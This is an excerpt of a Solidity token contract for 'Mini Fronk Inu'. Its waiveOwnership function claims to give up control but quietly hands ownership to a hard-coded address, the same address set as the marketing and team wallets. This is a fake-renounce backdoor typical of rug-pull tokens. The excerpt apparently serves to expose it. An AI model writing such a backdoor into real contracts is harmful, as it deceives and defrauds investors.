...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xb22882d8DB91A4925ACBA3Ee0A27E7bdDF7D9257));
        _owner = address(0xb22882d8DB91A4925ACBA3Ee0A27E7bdDF7D9257);
    }
...
contract MiniFronkInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Mini Fronk Inu";
    string private _symbol = "MINIFRONK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb22882d8DB91A4925ACBA3Ee0A27E7bdDF7D9257);
    address payable public teamWalletAddress = payable(0xb22882d8DB91A4925ACBA3Ee0A27E7bdDF7D9257);
